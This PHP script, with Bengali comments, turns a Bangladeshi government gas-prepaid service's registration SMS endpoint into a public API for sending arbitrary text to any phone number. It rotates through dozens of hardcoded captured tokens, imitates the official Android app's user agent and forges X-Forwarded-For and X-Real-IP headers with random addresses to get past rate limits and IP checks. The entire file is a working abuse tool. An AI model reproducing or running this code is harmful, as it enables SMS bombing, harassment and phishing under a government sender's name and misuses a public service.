<?php

header("Content-Type: application/json");

function generate_random_ip() {
    return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
}

// আপনার দেয়া encrypted values এখানেই থাকবে
$encrypted_values = [
    // নতুন টোকেনগুলো প্রথমে এড করা হয়েছে
    "I3Q8+C1dKLed/sujhjjxjuj/fMUVkaIMzTc3T6glGBNPpw41ImENbuX4M+CrqquYB1R+8WH6+sin0ir576YwBw==",
    "Ztb3zac/epZJ5QTb8NVC+RXI0d8UsUA3/3zyoSNoIuWFkLGWx0dkuAgdKoUSUjm/s5Ua/KiMP8buR8kqD/ox+g==",
    "g7fZx3Tbk7kZrntnK5QtzH7w4Ig3qHIGiPCVf0aatswsDQgm0/5ghKmf4jDX9pkPSyZN0aYxZZqDhhxdSRD/xw==",
    "UXz67lxzYpPEMbbMT+xBtKTh6vjY4f/IB6eYsyt0vF0tEry3VKm6iBMnfhLRCVLua5D3Z5JKlr6MenTUgVnD3Q==",
    "phbmbXWb4h1HTS/a7IFaGbWSGz2fy8cynclUzH3IqzrpYPLAL5S0HJR39LO0PfV+lK6sOF9qBH8Pcbvm5mySuA==",
    "Qm8dtNXRih/TR8wFNhy4P3IWZ0OZ6B/oXxg6Y8ORh2nwrsfb0cww1pkikXT8bY750rsR2WDAWUijf/nfzZd/hg==",
    "af+sp22GFceZ9smS1HhzL7+QN/A/HO3QYIoDY3fUq6hiVqYkxwJLGnDsyq9U/xpwx+iNh+72FJNpT77i57eBBQ==",
    "Bs3EIf3mHwTqtJNSzBJ/I5tDGMfXQiE2aWAOQeejORiCZahiX4ebKj4NlQoIqncBI5xiQWztbORLsMfxQdo0dg==",
    "WdxC0dyUR9vdzQBzKjkRo8I+bZ+LmXFy7eUtMAUvQKavLjqKT28HWgQ8YHcSoJ85MHC54Ir8jSIjV8VSDIXUIA==",
    "UTeU/rmMmfHOxAcuoLMRfaAqm80f/9lskI47qavVunz6C/8bn25BTsVOaNKjnRlIycKFa7E77055BD+UAXotcg==",
    "DHc7QmeXW3zCU3yR3puBF6H9jCWtb8b3jycCQqbGiuWm07DY/l+DR3nWeNqURjHqMb9kzg3HJc8O9KMKivng+Q==",
    "LDnpTr3bjN2QlHgv6uG+ZGpYMgy2DFZRVJJeCC5CqPWMACqpbOwfJ7quGTGrv6b4D5U9y/WzldxjfTMOwb99MQ==",
    "nrD/ZvzrhKA1ny2EJi3oX5AQXcBx7qW/ka6CvUbNq+hmCgAnVcYEvvlLu4wZez3BAXJg0/KsSQInosRUIXGQxg==",
    "agtvQ7fDGsXIayOhyjmgks7193qd9erXAskRsPzCZlm4K9brI0FHUIDdA5Ou4sQghzKdID4IS5pA79Xxc4nHfA==",
    
    // আগের encrypted values
    "gAYz29JzinNNhcjC8ni1Kk/6wBiy776ld6ARhRYkls/AaMlIxS2yHi1CympzY1ZZiyfVqF7rwG/++t1oUJMW5A==",
    "qFW1b32LfDS0/vYRg5VSuQj4x8vdZLxLKfPdO0SoZWMWNyaslllKFc9Nk3aGguMIbp7QDEjuRcKvh7VxYT/+JQ==",
    "agpFlbR9mg3GcMRTq/VbbBZ+YxtINZLxo/4EGOL2GmWNVQTE2+V+Sv7pNoY7Zf8VY8D10eS/MwryEkEiM2QcjQ==",
    "QlXRORy25nEiddN/gicp+OrDWW17ShRBRG2WVOqcOr2EJs1oWBzAlhCkW7ABrBGri/eBfRzN9iAv6iuSRrg0kQ==",
    "XhwlHEV11zjpBHj1Ttdcz4wH6a3herhe2z1RxfT5xZG2Ypf2sizIqTx1Ur/D7gJir8q9G3armefH1TXeLavrGg==",
    "Cs62EoU5/hAGFYIDR1vblZUpbMoYmDjaK4YAhVGMRepkmpS29WfgsGAL8QopyU1HcURMt7hZ+gB5dBci/ZOkEg==",
    "oxMKiaf1gUjX4Gkic+UrlYJs9cQsevx2ZrGmFqJNrS1Z57amCoIapqKAKBcvrJyfhnzQAVv397e0ve32jD3B4g==",
    "pTvIeMy2pI9CPqpfmZen9PWEeNPkouyOfwS79XobqM3arfSjrPJ4mFUnPNZiaBrJGScSDsDYFf7wXo8fGm4f2A==",
    "JBXnllymEB586jeBEX09MnSxan0RYQgvgGlsnFYRZoL96xQYuSuCNjEOb/Ci/ni+laQd4P93Xqx/8xnaxeHGvw==",
    "WoPMwQbFvW0JUxQ+J6Ngg2dA4xU4GL/EYHas1l9Ot8TL6h4oshhnLDxFq1ZeOKp3Qbr9T+J129FeAREeZc7hOg==",
    "dEB36nBD4hahsztgBOBKeOp7okeRjrT53LMyH6zEYl6/ZhHocxlyvwOfWkz4K9zay/1N8v6VmZbOUr1LRXAP1Q==",
    "DtEkQjjh+Y7nGotXcDrYEUhPA2EFvuz7/9/tRaB8iRiAwC8ycX2PeO8pgyURF3aFwv0bA/yyfDDOAf3vyhBzTx==",
    "TFd0U3GTZzIX4B32a8AJNPbfbih+6jmAS6lwoxB76/+cU3Z+rwgvzldSOluCGLCbJzcgf9IpANaaNRt3hxN8IA==",
    "SNaGb2LnoUbfBJoYg8iB+0JVMHEYQPcSnAsLPEfhNGD7hDJFlOlsuDn6mSfEkUR8yBe9bZO2IXkPkLu/l+rA/w==",
    "o0roneKFZLrjLv3FEhvcrFrO0Hxh2jx/OSt8zHEytJvnNedXpeUcWb8S4WQKN0MEhAZCW+xhuZPV4QsVAk+lXw==",
    "Eyrzzf0aTycGNCf/MpMCnly7WoqloxctluPWJMctwUtxC/HMR+/TlKEz/zyzHPRmCENKM53waRLFDjivXf4+wQ==",
    "QFAzmMu0EAvj6Zmh479FrZw9BLuNtM3c/4gnmig9XSiDZyRvTb7VsgGJ576K5xkYZlCNGVeLOMjFJX5xVADNhw==",
    "o+6i5RaHLoNXLe2R+wLQXaujaG9990vuDUI0W9Xzm9uUXXBrOzyXLXnPw2+BykfQwHa1q2fJJ3xY211Ji+k7cg==",
    "gaIeJOg2ixM+O+/Agdqzwx+QYTPt4yz5NNL6HUz9q5cLHCZQhajgUYmVx/xZ2zD0mwYLhsquVNtkBUgMjDylmQ==",
    "e6FFdrnGbA1AkCIQ/MZUe0T76CGvpWYfXRovRzqkIK/VhE1JSdltzC5MJUQ9dMvsNnwE10MV342T/D8XI5jSyw==",
    "HfpJEcaYufQlzM2LsiL8TpAjufRs0XpRey4UJwBvRp6L6XqWeCavJr27rYoPZT8HvEzfqgFI/fLuoxKvjm8O/w==",
    "lTsn4bmitn7O6tqLpDw9ymy1OnSjjZKJB5H/4kzouu5IilGPzD3fbAPPBeW/0ufsbmTsFlWW7geez7HPe7N0vA==",
    "SP2hWbFyDkbfsmFa8i4/S3KpckaRMOPWPQCFxkETCUs1WVjXQInnrbmC8weAEQNpmL//EHz65EPpPR+nzUGBEw==",
    "RPq/ct8FWF9IIlDUSVEZfLJ0q6In+ZvjC0Y0FzDHRUekXJDX5R4CoEICo75U4JadzHrMtvUtDjIVeYiAbAH1ww==",
    "O9gJVlNOVR1x5QtcIhq74BQxEv+xikYG8xp6Qslgw54L27IcE2Z4hN6eXWQiVHRLm/wB62SxaUGlMPv77Rux1g==",
    "mv91iIcXDlNmtvTwPlBo14FDZClLAVnITRasS5aWt7INp3b8lkMtxXdxYmB5FxdkVBq2WAuqfBwpUY0fqwtQdA==",
    "amFo36nMhtWB8RNTZkQCFp2/RQVNKPhb/Cr4NmClQDqKBb8V3Kt+o+KPWbDN3K45BTULu5nUoM5Vr/kgH3GDzg==",
    "WNwLn3QZt/iFhoCKV0zddsoFCU4vjQGplOh6jt7emFVlNKCWyo2DlnB4yJMPV7dnLzCQAKDnTDgrWt1Fo5ez6A==",
    "l2O0nkjC4kzEQWSZL+ezuYNforzARZbniPinQ0El8ehDup7uE05ag6HIAziIYMpbCQhwhpXcSzr7LarhFofERA==",
    "R64ZMYig8PC5kdwxbV/IJD8NvBbAMQ0L8wd+cRtRusNDIFrusXP30p89cfQuARJNwCQfV+bei4sIXPgDGqhUlQ==",
    "g40SgDvHuJ3Filb+72yjNvZepo6s7gZxWlGwmniJX9sHjIbeQ952d7ESIA9LixCQ5XO+a8dN2hF4QKhbaKjlsw==",
    "VAV+rVfdwby+9MEACXLV29RCBc8aqCayJ9u1KpeIdJFg0M39+JlWuNarE+usEaaV/rjVDJJeDG6GRMah50X5JA==",
    "odGEjY7beE9btYsisHqMYtUNTZeG0DuC10GpM0uZXLl2XcmBEMUm7PRYHuXmvrEQ/4Zorv4v40w0Ht87ZtzUag==",
    "RKxmBTdEFTgDHQYLn8RjtPiGwjmGYCXLywl8NpsdM2WrGQ8CQn8I2o2lUaSFdYxHiINH4wzGZOeXY9JUoydlUQ==",
    "IiriKeMu3uJjXLDMq1+aA7DOQ6yjBQUtAx9hHsNdejjT0FH0GOwqCdE2EOa1IBleQMh2BOWCEQ3KhkmaaUL1vw==",
    "jDiFbkpf6POTHNy34qMoayoVM4RqwPrLT9n6l9JRBdmPWWVs071ThzYSCrcMJN0BdMmAavlUuLS/iysj7lfyiA==",
    "CCj9gaKeuJGAaGjofOV95Yc/t8NykffwYxmKdNakQfqgB4xQFTdWhZ4cHLA4lbDIozCbXGR7dMQUIDtApEuqRw==",
    "gmd/EzZ719M0EiAO9fvgdVcJxNy9mFCmPzBVT0B3/3uk5e8UXyXj3RM4k9s8N+BbG8EL0P1cvaCvlFwo3+gcOQ==",
    "nu8FQB7or7CrAzTl3ITEx7YwVbNooZ/GCjqa0Yz6x7TyPJFGbXZ83fMWzDvf93lBvTA6C9bqf5mLodAAmXt6zw==",
    "QWVxT98R1CMlxYpZh4avKBi2T+DaBTNRwAw19GKHgGJcJuPIhTeIYyaNVQdPwmvP+AV5mbCBVDNelmA9HiPEcg==",
    "A7BBGlEl0C3XOcBppbteTO/fMp0MFeqGA790Ip4cYZmHffivKp1ERiSRAmA9GUJtGCoxW6LANb03Trfi/N4X4Q==",
    "gK7IElls0ThaUUmuMKM6u5/0WZt4SietP0bs5ZDyk/5C+1Vex3j701mMd5TIAaZ4lAWWbggSsPDLW+czF3w3hg==",
    "KCS3Qv8U1fMnud8zgReVUQ7Cey8+uvxZpPLmsuMmZRAs6E5ooZDjH6E2xNBhheV+kBmIG43XH+hp24Q3fAVImA==",
    "Jvw93l+0YqcImnBz01FR/YSZNyZGpK426fg2PvRhmpOFq+rLeWOTJCuWi2Fy8KmHO+o5ll1AB/BjPOqcCL2gvA==",
    "kbmh7IpA4x57vjkUJ5nf5WLND1+wwvzfwo2l3S/GKVVuhIKLMHG/VQYBlDM3pw7KN9jygJ0ts+mGjJOcgPx1bQ==",
    "J4wHKpkIOHxOkbOIx+ho3VV2Bax1bGgJX0TVgPX4iJOqPpMZoRElvnT6YaMdmorjLkf/OqEjY5/BTKiiIpum8A==",
    "W1aIC0vMKJFlexvGi5Ce6xidzKZ+WuWV0mbkW2XyFaPdTx/ZqF3AqAsVYBfrMPTE/9R/1OrXprEeExm2YMZhOQ==",
    "BCN9WxxAzhx1PwSSSSYUewxz8lmlAsacPWa2YfDRv6Q8kgggD5jJfx5d957L6BytSDrt9SFN1L0Sbi9oRV0RKw==",
    "GHG8X+jt3eFglzo60+FiRba0KuGzQ2tOgLFy7Gt74BzhVVh0nE+itX2/GrH6zBoPS17ne/aQhkkQdHdRmA07cA==",
    "EagYyXGCgr0aeASabSZEfV9KJueJIeUdRC0gPY2V6MYOaURoHuzg4jIjlNaUk7hpXTp9RnVXpNCj5WnUuSEMYg==",
    "haDm76QkPwXnFF40cs3FV6gWuddCHecZ0sXVn9iN/c/Y7vs99/9tf1nfOpp4dInAY6KVOsls+7yo/X2qfVulFw==",
    "BnT+KwzmIUqc5deEP+l9q0WEA1pC4ftoaNpliJZHAFgR2b0NHqFiv2ljHBR3S8EYQd9l/uq4f5gnah1lSoqTgg==",
    "DX9SMUaG3Ph8iXsuRy2kKqzgwGcj1nfw1+jr3vPbltJj36kgwNrTjXDaXnXZlZqyO2CNI5ma1sY0BKP/nhQj9Q==",
    "ieQ9PUSbNMl8O0rxTQYVRHZB1dGWIZkS0aMef0864zC/QLFqJ5O3xJMcD9VP62UmI3AFks6+jtySz6skJUWu8Q==",
    "M3LvJyCOV/HiRIG0x+zqdK9ffExbKOePhwla8G4po3evj9RxVFtQdk6vBo4EvbjlaeNlFbAZgqqhrfaxINp4cQ==",
    "RHZT7umWbkLgBrEaTnRI8SDcZKX5XqOGGFyH/Z5eYDgW8p1hmMZbMFAh2gYBdPw7b5Hqjwk7/Htmz2Lnqzux7Q==",
];

// ইনপুট নিন
$number = $_REQUEST['number'] ?? null;
$message = $_REQUEST['msg'] ?? null;

if (!$number || !$message) {
    echo json_encode([
        "code" => 400,
        "status" => false,
        "message" => "Parameter Missing",
        "API_OWNER" => "@hadi_vai1"
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

// র‍্যান্ডম ভ্যালু নির্বাচন
$selected_value = $encrypted_values[array_rand($encrypted_values)];

// নতুন হোস্ট URL
$url = "http://jgtdslprepaid.gov.bd:8082/nbp/sms/code";
$spoofed_ip = generate_random_ip();

$payload = json_encode([
    "receiver" => $number,
    "send_sec" => $selected_value,
    "text" => $message,
    "title" => "Register Account"
]);

// নতুন হেডার সেটিংস
$headers = [
    "Host: jgtdslprepaid.gov.bd:8082",
    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Infinix X6532 Build/UP1A.231005.007)",
    "Accept: application/json",
    "Accept-Encoding: gzip",
    "Content-Type: application/json; charset=UTF-8",
    "language: en_US",
    "timezone: Asia/Dhaka",
    "authorization: Bearer ",
    "X-Forwarded-For: $spoofed_ip",
    "X-Real-IP: $spoofed_ip",
    "Connection: Keep-Alive",
    "Content-Length: " . strlen($payload)
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
$response = curl_exec($ch);
$status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($response && $status_code == 200) {
    $res = [
        'code' => 200,
        'status' => true,
        'message' => 'SMS Sent Successfully !',
        'API_OWNER' => '@hadi_vai1'
    ];
} else {
    $res = [
        'code' => 503,
        'status' => false,
        'message' => 'SMS Send Failed !',
        'API_OWNER' => '@hadi_vai1'
    ];
}

echo json_encode($res, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
?>